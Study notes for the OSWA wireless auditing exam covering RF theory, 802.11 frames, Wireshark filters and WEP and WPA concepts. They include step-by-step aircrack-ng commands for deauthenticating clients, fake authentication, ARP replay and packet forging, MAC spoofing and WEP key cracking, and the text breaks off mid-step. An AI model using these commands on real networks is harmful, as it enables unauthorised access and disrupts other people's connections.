# OSWA God-Tier Notes by Optixal

## Table of Contents

- [Book Contents](#book-contents)
- [1. Why Audit Wireless Networks](#1-why-audit-wireless-networks)
  * [5E Attacker Methodology](#5e-attacker-methodology)
    + [1. Exploration](#1-exploration)
    + [2. Enumeration](#2-enumeration)
    + [3. Exploitation](#3-exploitation)
    + [4. Embedding](#4-embedding)
    + [5. Egress](#5-egress)
- [2. RF Spectrum](#2-rf-spectrum)
  * [Concepts](#concepts)
  * [2.4 GHz Frequency Table](#24-ghz-frequency-table)
- [3. Wireless Protocols, Equipment & Security](#3-wireless-protocols--equipment---security)
  * [Concepts](#concepts-1)
  * [Commands for Setting Up Wifi Adapter](#commands-for-setting-up-wifi-adapter)
    + [Command to Find Out Wireless Chipset Info](#command-to-find-out-wireless-chipset-info)
    + [Chipset Prefixes](#chipset-prefixes)
    + [Find Out Supported Parameters for iwpriv](#find-out-supported-parameters-for-iwpriv)
    + [Setting Frequency Band of Wireless NIC](#setting-frequency-band-of-wireless-nic)
    + [WiFi Modes](#wifi-modes)
    + [Commands For Changing Band and Mode on Non-Atheros Chipsets:](#commands-for-changing-band-and-mode-on-non-atheros-chipsets-)
    + [Commands For Changing Band and Mode on Atheros Chipsets:](#commands-for-changing-band-and-mode-on-atheros-chipsets-)
    + [Frame Injection](#frame-injection)
    + [Associate with an Open AP with SSID oswa](#associate-with-an-open-ap-with-ssid-oswa)
    + [Associate with a WEP AP with SSID oswa with Non-Atheros Chipset](#associate-with-a-wep-ap-with-ssid-oswa-with-non-atheros-chipset)
    + [Associate with a WEP AP with SSID oswa with Atheros Chipset](#associate-with-a-wep-ap-with-ssid-oswa-with-atheros-chipset)
    + [Associate with a WPA AP](#associate-with-a-wpa-ap)
    + [If No DHCP Server Available](#if-no-dhcp-server-available)
  * [Wireless Frame](#wireless-frame)
    + [Distribution System Bits](#distribution-system-bits)
    + [Frame Control Header Types and Subtypes](#frame-control-header-types-and-subtypes)
      - [Getting Information Using Wireshark](#getting-information-using-wireshark)
        * [Wireshark Filters](#wireshark-filters)
        * [Checking for Frame-Level Encryption](#checking-for-frame-level-encryption)
        * [Finding SSID of AP From Beacons](#finding-ssid-of-ap-from-beacons)
        * [Finding SSID of AP From Client Probe Requests](#finding-ssid-of-ap-from-client-probe-requests)
        * [Finding Supported Bandwidth Rates of an AP](#finding-supported-bandwidth-rates-of-an-ap)
        * [Decrypt Encrypted Packets On-The-Fly](#decrypt-encrypted-packets-on-the-fly)
      - [Getting Information Using Kismet](#getting-information-using-kismet)
      - [Kismet Setup](#kismet-setup)
      - [Start Kismet](#start-kismet)
      - [Kismet Packet Capture](#kismet-packet-capture)
      - [How a Client Associates with an AP](#how-a-client-associates-with-an-ap)
- [4. Wireless Security Testing - Infrastructure](#4-wireless-security-testing---infrastructure)
  * [Concepts](#concepts-2)
    + [Wireless Sniffers](#wireless-sniffers)
    + [802.11i](#80211i)
    + [WEP](#wep)
      - [WEP Types](#wep-types)
      - [WEP Details](#wep-details)
    + [WPA](#wpa)
      - [WPA Types](#wpa-types)
      - [WPA2 Types](#wpa2-types)
      - [WPA Details of PSK](#wpa-details-of-psk)
      - [WPA 4-Way Handshake](#wpa-4-way-handshake)
  * ["Practical Auditing"](#-practical-auditing-)
    + [Prep Chipsets (Monitor Mode and Frame Injection)](#prep-chipsets--monitor-mode-and-frame-injection-)
    + [Test Injection and Quality](#test-injection-and-quality)
    + [WEP Cracking](#wep-cracking)
      - [Capturing IVs](#capturing-ivs)
        * [Workbook Method (With associated victim)](#workbook-method--with-associated-victim-)
        * [No Client Associated Method 1 (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)](#no-client-associated-method-1--may-require-mac-of-previously-seen-associated-victim---may-require-changing-own-mac-to-victim-s--refer-below--)
        * [No Client Associated Method 2 - Interactive Replay Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)](#no-client-associated-method-2---interactive-replay-attack--may-require-mac-of-previously-seen-associated-victim---may-require-changing-own-mac-to-victim-s--refer-below--)
        * [No Client Associated Method 3 - PRGA Packetforge Interactive Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)](#no-client-associated-method-3---prga-packetforge-interactive-attack--may-require-mac-of-previously-seen-associated-victim---may-require-changing-own-mac-to-victim-s--refer-below--)
        * [*Changing MAC Address (Required when AP uses MAC filtering)](#-changing-mac-address--required-when-ap-uses-mac-filtering-)
      - [Crack Password With IV Data](#crack-password-with-iv-data)
    + [WPA Cracking](#wpa-cracking)
      - [Capturing 4-Way Handshake](#capturing-4-way-handshake)
      - [Validating 4-Way Handshake PCAP](#validating-4-way-handshake-pcap)
      - [Cracking WPA PSK](#cracking-wpa-psk)
    + [DoS](#dos)
      - [Aireplay-ng DoS](#aireplay-ng-dos)
      - [MDK3 DoS](#mdk3-dos)
    + [Probemapper](#probemapper)
- [Resources](#resources)

## Book Contents

- Why Audit Wireless Networks: Pg 4 - 20
  * Business Requirement For Wireless Auditing: Pg 4
    + CIA: Pg 9
  * Laws and Jurisdictions: Pg 10
    + Legal and Best-Practice Compliance: Pg 11
  * 5E Attacker Methodology: Pg 14
- RF Spectrum: Pg 23 - 45
  * Concept of RF: Pg 23
  * Calculating Wavelength of a Given Frequency: Pg 24
  * Diffraction: Pg 25
  * Concept of Gain: Pg 26
  * Power and Distance: Pg 28
    + Sensitivity of Signal Strength 
  * Attenuation: Pg 30
    + Medium Attenuation and Free-Space Loss Formula: Pg 32
  * Interference: Pg 34
  * RF Spectrum Analysis: Pg 37
  * Wireless Footprint - SOIL: Pg 42
- Wireless Protocols, Equipment & Security: Pg 49 - 131
  * The 3 Wireless Networking Specifications: Pg 49
  * Bluetooth: Pg 51
    + Bluetooth Technical Specs: Pg 52
    + Bluetooth Pros and Cons: Pg 53
    + Bluetooth Weaknesses: Pg 54
    + Bluetooth Attack List: Pg 55
    + Bluetooth's Threat to Companies and Individuals: Pg 57
    + Bluetooth Defences and Mitigation Strategies: Pg 59
  * RFID: Pg 60
    + RFID Frequencies: Pg 61
    + RFID History: Pg 62
    + RFID Privacy Issues: Pg 64
    + RFID as a Security Risk: Pg 70
    + RFID Architecture: Pg 71
    + RFID Architecture - Tags: Pg 72
      - Tag Maximum Read Range Dependencies: Pg 73
      - Tag Characteristics Summary: Pg 64
    + RFID Use Categories: Pg 76
    + RFID Security: Pg 77
      - Whose Security: Pg 77
      - Legislation: Pg 78
      - Information Theft and Enumeration: Pg 79
      - Information Modification and Item Theft Example: Pg 80
      - RFID Defences and Mitigation Strategies: Pg 87
  * 802.11: Pg 89
    + 802.11 Alphabets: Pg 89
    + 802.11 Types, Frequencies, Bandwidth, Range: Pg 90
    + 802.11 Terminology: Pg 91
    + 802.11 Wireless Infrastructure Equipment: Pg 99
    + 802.11 Wireless Clients and Chipsets: Pg 102
    + 802.11 Master Mode and Monitor Mode: Pg 108
    + Selecting Wireless Chipsets: Pg 111
      - Support for Frame Injection: Pg 112
      - Resources for Chipset Information: Pg 113
    + Wireless Stacks - IEEE80211 vs MAC80211: Pg 114
    + Wireless USB Devices Issue: Pg 115
    + Ndiswrapper and Linuxant Driverloader 
    + Wireless Accessories: Pg 117
      - External Antennae: Pg 117
      - WIfi Detectors: Pg 119
    + Wireless Frame Architecture and Analysis: Pg 121
      - Similarity to Ethernet: Pg 121
      - 802.11 Frame Layout and Frame Control Header: Pg 122
      - The 3 Frame Control Header Types and Sub-Types: Pg 123
      - Basic Association Process: Pg 125
      - 802.11 Frame Control Header with Address Fields 
    + Wireless Audit Prep: Pg 129
      - Locking Down Your Audit Station: Pg 129
      - Tool Selection: Pg 130
      - The OSWA Assistant: Pg 131
- Wireless Security Testing - Infrastructure: Pg 134 - Pg 177
  * Wireless Sniffing: Pg 134
  * 802.11 Encryption and Authentication Types: Pg 137
  * WEP: Pg 138
    + WEP Shared Authentication Association Process: Pg 138
    + WEP Analysis: Pg 139
    + Defending Against WEP Attacks: Pg 144
  * WPA: Pg 145
    + WPA-PSK/WPA2-PSK Analysis: Pg 146
      - Passphrase to Pairwise Master Key 
    + WPA 4-Way Handshake: Pg 149
      - WPA-PSK/WPA2-PSK Dynamic Key Exchange: Pg 150
    + WPA-PSK/WPA2-PSK Seed Value Problem: Pg 152
    + Defending Against WPA-PSK/WPA2-PSK Attacks 
    + WPA/WPA2 Enterprise or WPA-RSN 
      - WPA/WPA2 Dynamic Key Exchange: Pg 158
      - WPA Enterprise Limitations: Pg 159
      - WPA Enterprise Authentication Schema 
        * Component Requirements for Client and Server: Pg 163
        * LEAP: Pg 166
        * Compatibility with Linux-Based Devices: Pg 167
      - Defending Against WPA/WPA2 Attacks 
      - Other WPA/WPA2 Considerations: Pg 173
  * 802.11-Based Denial-of-Service 
    + 802.11w Management Frame Protection 
- Wireless Security Testing - Client: Pg 181 - 196
  * Auditing Wireless Clients: Pg 181
  * Client Probing: Pg 182
  * Discovering Wireless Clients: Pg 185
    + Using Probemapper: Pg 187
    + WCCD Vulnerability: Pg 192
  * Defending Against Client-Side Attacks: Pg 196
- Testing With A Twist: Pg 198 - 264
  * Ph00ling: Pg 200
    + Why is Ph00ling Possible: Pg 201
    + Ph00ling Technique: Pg 202
    + Defeding Against Ph00ling Attacks: Pg 211
  * Long Range Auditing: Pg 213
    + Cantennas: Pg 217
      - Cantenna Components: Pg 219
      - Cantenna Assemble: Pg 221
      - Cantenna Optimization: Pg 236
      - Cantenna Benchmark Performance Testing: Pg 239
      - Cantenna Range Performance Testing: Pg 239
    + WNIC Antenna Jacks: Pg 249
- MoocherHunting: Pg 267 - 274
- Concluding The Audit: Pg 277 - 280
  * Unexpected Results: Pg 277
  * Reporting Format and Procedure: Pg 279
  * Practical Recommendations: Pg 280

## 1. Why Audit Wireless Networks
* Chapter Pages: Pg 4 - 20
* 5E Attacker Methodology: Pg 13 - 20
---
### 5E Attacker Methodology

#### 1. Exploration
Reconnaissance. Find out info about the target : how many wireless networks? SSID? Location and coverage of the wireless networks? Private or Public network?
   
#### 2. Enumeration
Determine weaknesses in target network : Is encryption used? What kind of encryption? Are all APs using same encryption scheme? Any vulnerabilities in encryption implementation (eg weak passphrases), how many active clients connected and/or generating traffic? Do active clients have wireless profiles other than profile for the target? Is proximity access possible or must use range extenders?

#### 3. Exploitation
Attempt to penetrate or disrupt target using weaknesses found during enumeration. Run specialized exploitation tools against wireless network or client. Run DoS tools to increase chance of successful exploit.
   
A wireless audit would end after this stage. Companies would not want you to do embedding and egress!

#### 4. Embedding
Seek to retain access to network (eg Trojan/rootkit/backdoor installation)

#### 5. Egress
Pull out of system – clean up evidence that attacker has been there

## 2. RF Spectrum
* Chapter Pages: Pg 23 - 45
* Calculating Wavelength of Frequency: Pg 24
* Calculating Sensitivity of Signal Strength with Power: Pg 29
* Calculating Attenuation and Free-Space Loss: Pg 32
* RF Spectrum Analysis: Pg 39
* SOIL: Pg 42
---
### Concepts

* Isotrophic Radiator  
Hypothetical antenna that radiates equally in all directions (perfect sphere)

* Gain  
How much signal favoured in a certain direction. The greater the gain, the more compressed into a donut shape it is. So a high gain of 14dBi pumps out a signal further than a 4dBi antenna but has a narrower beamwidth, so more accuracy is required in positioning it.
  * 3dB rule (more accurate calculation found in "Power and Distance"): double power, gain 3dB; halve power, lose 3dB.
  * dBm - Decibels relative to milliwatts
  * dBi - Decibels relative to isotrophic
  * The higher the gain, the longer and flatter the signal pattern is (compression into a "donut" shape)
  * The lower the gain, the more sensitive it is to electromagnetic energy of that strength (improve sensitivity by setting dBm to as low a negative value as possible eg. -100dBm, but bear in mind the noise floor)

* Transmission Range and Reception Range  
Impacted by antenna design (gain and reception sensitivity), IC processing algorithm (how efficient is it in interpreting a signal at a given strngth in a sea of noise), transmission power, attenuation (design, free-space/enclosed path loss, environmental), etc.

* RF Spectrum Analysis  
A spectrum analyzer graphically plots peak RF energy points for each frequency or band being measured:
* Red - Strong
* Yellow
* Light Blue
* Dark Blue - Weak

* Sphere of Influence Limit (SOIL)
  * Maximum SOIL (MAX-SOIL)
  * Signal Reacquisition SOIL (SR-SOIL)
  * Once you get dropped (beyond MAX-SOIL range), you will have to get much closer to the AP before you can get a successful association (SR-SOIL)

### 2.4 GHz Frequency Table

| Channel | Frequency | Uses
|:-------:| ---------:| -------------------------------------
| 1       | 2.412 GHz | Often Used As Non-Overlapping Channel
| 2       | 2.417 GHz |
| 3       | 2.422 GHz |
| 4       | 2.427 GHz |
| 5       | 2.432 GHz |
| 6       | 2.437 GHz | Often Used As Non-Overlapping Channel
| 7       | 2.442 GHz |
| 8       | 2.447 GHz | Microwave (~2.45 GHz)
| 9       | 2.452 GHz |
| 10      | 2.457 GHz |
| 11      | 2.462 GHz | Often Used As Non-Overlapping Channel
| 12      | 2.467 GHz |
| 13      | 2.472 GHz |
| 14      | 2.484 GHz | Often Used As None-Overlapping Channel

* USA
Channels 1 - 11, the FCC has mandated only these channels as usable.
* Asia & Europe
Channels 1 - 13
* Japan
Channels 1 - 14

## 3. Wireless Protocols, Equipment & Security
* Chapter Pages: Pg 49 - 131
* 802.15 Bluetooth: Pg 51 - 59
  * Bluetooth Attack List: Pg 55
* RFID: Pg 60 - 88
  * RFID Architecture - Tag Characteristics Summary Table: Pg 74
  * RFID Security - Info Mod & Item Theft Example: Pg 80 - 85
* 802.11 WiFi: Pg 89 - 131
  * Wireless Frame Architecture - Frame Layout and To/FromDS Table: Pg 126
---
### Concepts

* Basic Service Set (BSS)  
A group of 802.11 clients form a **Basic Service Set** (BSS).

* Independent Basic Service Set (IBSS)  
A network in ad hoc mode with wireless clients without an Access Point.

* Infrastructure Mode  
Wiresless clients talk to Access Point and not directly to each other.

* Distribution System (DS)  
The means by which Access Points talk to other Access Points to exchange frames for wireless clients in their respective BSSs, forward frames to follow wireless clients as they move from one BSS to another, and exchange frames with a wired network.

* Basic Service Set ID (BSSID)  
MAC address of Access Point radio component. Some Access Points use different MAC addresses for their radio component and the wired Ethernet port. (The MAC addresses are likely to be sequential).

* Extended Service Set  
A set of infrastructure BSSes whose APs communicate among themselves.

* Extended Service Set ID (ESSID) or SSID  

* Association/Disassociation  
Connecting and disconnecting from an AP as the client enters and leaves its RF sphere of influence.

* Roaming  
Act of disassociating from one AP and associating with another AP within the same Extended Service Set.

* SSID broadcasting  
AP shows its SSID in frame beacons.

* Wireless NICs and Chipsets  
When doing wireless auditing, the chipset is important. Brand doesn’t matter. Need a chipset that is supported natively under Linux.

### Commands for Setting Up Wifi Adapter

#### Command to Find Out Wireless Chipset Info
* `airmon-ng`
* `dmesg | less`
* `lspci -vv | less` (for PCI cards)
* `lsusb -vv | less` (for USB)

#### Chipset Prefixes
* Ralink Chipsets - "rt"
* Realtek Chipsets - "rtl"
* Atheros Chipsets - "ar"

#### Find Out Supported Parameters for iwpriv
`iwpriv [interface]`

#### Setting Frequency Band of Wireless NIC
`iwpriv [interface] mode 3`

* Mode 3 is for 802.11g
* Mode 2 is for 802.11b
* Mode 1 is for 802.11a

#### WiFi Modes
`iwconfig [interface]`

* Ad-Hoc Mode
* Managed Mode
* Monitor Mode : WNIC operates in RFMON mode. For sniffing frames.
* Master Mode : WNIC operates as AP. Useful for testing wireless client security

#### Commands For Changing Band and Mode on Non-Atheros Chipsets:
* `ifconfig [interface] down`
* `iwpriv [interface] mode 3`, 3 for "G" band. Card may not support this, and may use this by default already.
* `ifconfig [interface] up`
* `iwconfig [interface] mode monitor` or `iwconfig [interface] mode master`
* `iwconfig [interface] channel [target]`

#### Commands For Changing Band and Mode on Atheros Chipsets:
* `wlanconfig ath0 destroy`
* `wlanconfig ath0 create wlandev wifi0 wlanmode monitor` or `wlanconfig ath0 create wlandev wifi0 wlanmode master`
* `iwconfig [interface] channel [target]`

#### Frame Injection
For Ralink chipsets, additional commands are required to enable frame injection:
1. `iwpriv [interface] forceprism 1`
2. `iwpriv [interface] rfmontx 1`

Visit http://linux-wless.passys.nl to check native Linux support for wireless chipsets.

#### Associate with an Open AP with SSID oswa
1. Connect with `iwconfig [interface] essid oswa`, requires "Managed" mode.
2. Check if BSSID is listed with `iwconfig`.
3. If BSSID is not listed, do one of the following to get associated:
  * `ifconfig [interface]`
  * `pump -i [interface]`
  * `dhclient [interface]`
4. The channel should be auto-set when associating an AP. To set channel manually with `iwconfig [interface] channel 6`.
5. To display more wireless info, use `iwlist [interface] scanning`.

#### Associate with a WEP AP with SSID oswa with Non-Atheros Chipset
1. `iwconfig [interface] mode managed`
2. `iwconfig [interface] essid [Name of AP]`
3. `iwconfig [interface] channel [Channel of AP]`
4. `iwconfig [interface] key [1-4] [WEP Key]`
5. `iwconfig [interface] key [1-4]`
6. `iwconfig [interface] enc on`
7. `pump -i [interface]`

#### Associate with a WEP AP with SSID oswa with Atheros Chipset
1. `wlanconfig [interface] destroy`
2. `wlanconfig [interface] create wlandev wifi0 wlanmode managed`
3. `iwconfig [interface] essid [Name of AP]`
4. `iwconfig [interface] channel [Channel of AP]`
5. `iwconfig [interface] key [1-4] [WEP Key]`
6. `iwconfig [interface] key [1-4]`
7. `iwconfig [interface] enc on`
8. `pump -i [interface]`

#### Associate with a WPA AP
> WB Pg 47 and Pg 81

#### If No DHCP Server Available
1. Find IP range, netmask and gateway using Wireshark in promiscuous mode with IEEE 802.11 decryption
2. `ifconfig [interface] [Static IP] netmask [Subnet Mask]`
3. `route add -net 0.0.0.0 gw [Gateway IP]`

### Wireless Frame

#### Distribution System Bits
* ToDS
  * This bit is set to 1 when frame is addressed to AP for forwarding to DS (normally for data frames).
* FromDS
  * This bit is set to 1 when frame is coming from the DS
* Refer to Wireless Frame Architecture - Frame Layout and To/FromDS Table: Pg 126

#### Frame Control Header Types and Subtypes

| Type Value | Type Description | Subtype Description | Subtype Binary Value | Hex Value |
| ---------- | ---------------- | ------------------- | -------------------- | --------- |
| 00 | Management Frames | Association Request | 0000 | 0x00
| 00 | Management Frames | Association Response | 0001 | 0x01
| 00 | Management Frames | Reassociation Request | 0010 | 0x02
| 00 | Management Frames | Reassociation Response | 0011 | 0x03
| 00 | Management Frames | Probe Request | 0100 | 0x04
| 00 | Management Frames | Probe Response | 0101 | 0x05
| 00 | Management Frames | Beacon | 1000 | 0x08
| 00 | Management Frames | Disassociation | 1010 | 0x0A
| 00 | Management Frames | Authentication | 1011 | 0x0B
| 00 | Management Frames | Deauthentication | 1100 | 0x0C
| 01 | Control Frames | |
| 10 | Data Frames | |
| 11 | Reserverd Frames | |

##### Getting Information Using Wireshark

###### Wireshark Filters
* To find beacon frames, filter by `wlan.fc.type_subtype == 0x08`.
* To find management frames, filter by `wlan.fc.type == 0x00`.
* To find control frames, filter by `wlan.fc.type == 0x01`.
* To find data frames, filter by `wlan.fc.type == 0x02`.
* To find ToDS frames, filter by `wlan.fc.tods == 1`.
* To find FromDS frames, filter by `wlan.fc.fromds == 1`.
* To find custom DS frames, filter by `wlan.fc.ds == 0x00`, where `0x01` is ToDS and `0x02` is FromDS.

###### Checking for Frame-Level Encryption
* HTTP GET requests and responses in plaintext.
* Check beacon frame or data frame:
  * "Protected Bit" in "Frame Control" - 0: No Encryption, 1: Encrypted
  * "Privacy Bit" in "Capbility Information" - 0: No WEP, 1: Supports WEP
* Check authentication frame:
  * "Authentication Algorithm" in "Fixed Parameters" - 0: Open System, 1: Shared Key

Alternatively, use airodump-ng and check "ENC" and "CIPHER" columns (more detailed) or Kismet's "W" column (less detailed).

###### Finding SSID of AP From Beacons
* Check in beacon frame.
* Check for probe requests and probe responses.

###### Finding SSID of AP From Client Probe Requests
* Capture packets in monitor mode and write them out to a PCAP file.  
`airodump-ng [interface] -w [file]`

* Open PCAP file in Wireshark.  
`wireshark -r [file]`

* Filter by probe requests made by a certain client.  
`wlan.fc.subtype == 0x04 && wlan.addr == [MAC of Client]`

* Select probe request frame
* Navigate to "IEEE 802.11 wireless LAN management frame" > "Tagged Parameters" > "SSID parameter set"
* SSID of AP the client is probing for should be displayed in "Tag interpretation"

Alternatively, use Wireshark's "WLAN Traffic Statistics" to view resolved SSIDs and probe requests by going to "Statistics" > "WLAN Traffic...". (Inaccurate at times)

###### Finding Supported Bandwidth Rates of an AP

* Filter by **responses** from certain AP (Probe, Association, Reassociation, and including Beacons)  
`wlan.fc.subtype == [subtype hex] && wlan.addr == [MAC of AP]`

* Select frame
* Navigate to "IEEE 802.11 wireless LAN management frame" > "Tagged Parameters"
* The supported bandwidth rates should be displayed in "Supported Rates"

Alternatively, `iwlist scan` will also show the supported bandwidth rates.

###### Decrypt Encrypted Packets On-The-Fly
1. Edit > Preferences > Protocols > IEEE 802.11
2. Check "Reassemble fragmented 802.11 datagrams.
3. Check "Enable decryption".
4. Paste key (in a certain format depending on type) into the key input box.

##### Getting Information Using Kismet

##### Kismet Setup
1. Wireless Applications > 802.11 > Kismet > setup kismet-server
2. Find line starting with "source=".
3. Modify according to your interface and driver (eg. "source=rtl8180,wlan0,wlan0" or "source=rt2500,ar0,ar0")
   * Refer to "12. Capture Sources" in "/usr/local/apps/wifi/kismet/etc/README" to find compatible drivers.

##### Start Kismet
1. Wireless Applications > 802.11 > Kismet > kismet
2. `ss` to sort list in alphabetical order

![How to interpret Kistmet interface](/kismet.jpg?raw=true)

##### Kismet Packet Capture
Kismet will automatically capture packets into a PCAP file (only if started from menu) which can be found in "/usr/local/apps/wifi/kismet/bin".

##### How a Client Associates with an AP
1. Client sends **Probe Request** to AP.
2. AP sends **Probe Response** back to client.
3. Client sends **Authentication** to AP (which isn't really authentication, nothing to do with WEP/WPA encryption yet).
   1. If WEP, AP sends **Challenge Text** (in clear) to client.
   2. If WEP, client sends **Challenge Response** (encrypted with WEP key) back to AP.
4. AP sends **Authentication** back to client. If WEP, includes success/failure of challenge.
5. Client sends **Association Request** to AP.
6. AP sends **Association Response** back to client.
7. Data frame exchange.

## 4. Wireless Security Testing - Infrastructure
* Chapter Pages: Pg 134 - Pg 177
* WPA 4-Way Handshake Purpose: Pg 149
* Defeding Against WPA-PSK Attacks: Pg 156
---
### Concepts

#### Wireless Sniffers
* Kismet
* Airodump-ng
* Wireshark

#### 802.11i
802.11i covers wireless security.

#### WEP

##### WEP Types
* WEP 40-bit Key (5 bytes)
* WEP 104-bit Key (13 bytes) (uses RC4)

##### WEP Details
* WEP uses 24 bit IVs

#### WPA

##### WPA Types
* WPA-PSK (Pre-Shared Key)
* WPA Enterprise
* (Both uses TKIP)

##### WPA2 Types
* WPA2-PSK
* WPA2 Enterprise
* (Both uses CCMP-AES instead of TKIP)

##### WPA Details of PSK 
* PMK(256-bit) = PBKDF2(Passphrase, SSID, SSID Length)
* Where PMK is Pairwise Master Key and PBKDF2 is Password Based Key Derivation Function.
* Using this standard, the passphrase, ssid and ssidLen are concatenated and hashed 4096 times to generate the 256-bit PMK.
* The PMK generated by client and AP are combined with 2 nonces (a parameter that changes with time, eg timestamp) to derive the Pairwise Transient Key (PTK), a hashed value used to encrypt data.

##### WPA 4-Way Handshake
* WPA 4-way handshake (EAPOL packets) takes place after the Probe Request/Response, Authentication Request/Response, Association Request/Response. Client and AP will generate the PMK.

|  AP  | Client |
| ---- | ------ |
| AP (the authenticator) sends client (the supplicant) a nonce. This is the ANonce. | 
| | Client calculates the PTK. Client sends to AP its own nonce (SNonce) plus security parameters (MIC, RSN length).
| AP calculates the PTK. AP sends ANonce, MIC and RSN length to Client. | 
| | Client sends MIC to AP.

* Temporal Keys 1 and 2 (TK1 and TK2) are used to encrypt the data travelling between the AP and the client.
* Group Temporal Key (GTK) is used for Broadcast/Multicast encryption.
* To run dictionary attack against passphrases of WPA(2)-PSK, the client MAC and AP MAC address, the ANonce and SNonce are required. So important to have strong passphrases if WPA-PSK2 is used.

### "Practical Auditing"

#### Prep Chipsets (Monitor Mode and Frame Injection)
* Set Wifi adapters to monitor mode by referring to "Commands For Changing Modes on Chipsets" in previous chapter.
* Don't forget, for Ralink chipsets, additional commands are required to enable frame injection:
  1. `iwpriv [interface] forceprism 1`
  2. `iwpriv [interface] rfmontx 1`

#### Test Injection and Quality
`aireplay-ng --test [interface]`

#### WEP Cracking

##### Capturing IVs

###### Workbook Method (With associated victim)

* Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* Deauths client to force the client to reconnect and make an ARP request.  
`aireplay-ng --deauth 500 -a [MAC of AP] -c [Client's MAC] [interface]`

* Captures ARP requests and replays them to generate more ARP traffic. Do with **fakeauth**.  
`aireplay-ng --arpreplay -b [MAC of AP] -h [Client's MAC] [interface]`

* Write out pcap file with captured ARP data packets and IVs. Do with inject. Successful when "Data" column in airodump rapidly goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 1 (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
`aireplay-ng --fakeauth 0 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`
`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* Captures ARP requests and replays them to generate more ARP traffic. Do with **fakeauth**.  
`aireplay-ng --arpreplay -b [MAC of AP] -h [Our/Client's MAC] [interface]`

* Write out pcap file with captured ARP data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 2 - Interactive Replay Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* Captures data frames and reinjects them to generate more traffic. Reply 'y' when prompted to reinject. Do with **fakeauth**.  
`aireplay-ng --interactive -b [MAC of AP] -d FF:FF:FF:FF:FF:FF -m 68 -n 68 -p 0841 -h [Our/Client's MAC] [interface]`

* Write out pcap file with captured data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### No Client Associated Method 3 - PRGA Packetforge Interactive Attack (May require MAC of previously-seen-associated victim) (May require changing own MAC to victim's, refer below*)

* Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* Attempt to associate with AP. Successful when "Association successful :)" **appears** and **stays**, with no deauthentication messages.  
`aireplay-ng --fakeauth 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 5000 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`  
`aireplay-ng --fakeauth 20 -o 1 -q 15 -a [MAC of AP] -h [Our/Client's MAC] -e [Name of AP] [interface]`

* Captures data frames and attempts to obtain PRGA from AP by reinjecting and generating more traffic. Stores PRGA in a ".xor" file in current dir. Reply 'y' when prompted to reinject. May require few attempts with different packets, better with FromDS: 1. Do with **fakeauth**.  
`aireplay-ng --fragment -b [MAC of AP] -h [Our/Client's MAC] [interface]`  
`aireplay-ng --chopchop -b [MAC of AP] -h [Our/Client's MAC] [interface]`

* Forge an ARP request packet using PRGA xor file
`packetforge-ng --arp -a [MAC of AP] -h [Our/Client's MAC] -l 255.255.255.255 -k 255.255.255.255 -y [.xor PRGA File] -w [filename]`

* Inject forged ARP packet, causing AP to generate traffic. Do with **fakeauth**.
`aireplay-ng --interactive -r [filename from prev step] [interface]`

* Write out pcap file with captured data packets and IVs. Do with **fakeauth** and inject. Successful when "Data" column in airodump rapidly goes up.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

###### *Changing MAC Address (Required when AP uses MAC filtering)

* Backup old MAC address (first 6 bytes of HWaddr)  
`ifconfig [interface]`

* Change MAC with one of the following  
  `ifconfig [interface] hw ether [xx:xx:xx:xx:xx:xx]` (may not work on all Linux distributions, doesn't work on OSWA Assistant.)
  * For Non-Atheros Chipsets:
    1. `ifconfig [interface] down`
    2. `ip link set [interface] address [xx:xx:xx:xx:xx:xx]`
    3. `iwconfig [interface] mode monitor`
    4. `ifconfig [interface] up`
  * For Atheros Chipsets:
    1. `ifconfig [interface] down`
    2. `ip link set [interface] address [xx:xx:xx:xx:xx:xx]`
    3. `ip link set wifi0 address [xx:xx:xx:xx:xx:xx]`
    4. `wlanconfig [interface] destroy`
    5. `wlanconfig [interface] create wlandev wifi0 wlanmode monitor`
    6. `ifconfig [interface] up`

* Verify that MAC address has been changed  
`ifconfig [interface]`

##### Crack Password With IV Data
`aircrack-ng -a 1 -b [MAC of AP] *.cap` (Will require 40k+ data frames with IVs for 104-bit WEP keys)

#### WPA Cracking

##### Capturing 4-Way Handshake

* Get ESSID, BSSID, Client's MAC, Channel.  
`airodump-ng [interface]`

* Prep an airodump to capture 4-way handshake packets.  
`airodump-ng --bssid=[MAC of AP] -c [channel] -w [filename] [interface]`

* Deauths client to force the client to reconnect and perform a 4-way handshake.  
